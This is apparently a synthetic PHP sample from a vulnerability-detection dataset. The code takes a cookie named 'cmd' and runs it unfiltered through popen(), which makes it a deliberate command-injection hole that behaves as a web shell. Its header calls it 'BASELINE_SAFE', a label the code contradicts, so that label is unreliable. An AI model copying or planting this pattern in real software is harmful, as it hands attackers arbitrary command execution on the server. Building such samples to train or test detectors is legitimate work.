<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=FILTER_INPUT_COOKIE; SKELETON=S1; KEY=cmd; SINK=B6; VAR=v0048 */
function SINK_B6($command){
    $handle = popen($command, "r");
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            echo $output;
}
$inp = (string)(filter_input(INPUT_COOKIE, "cmd") ?? "");
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B6($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
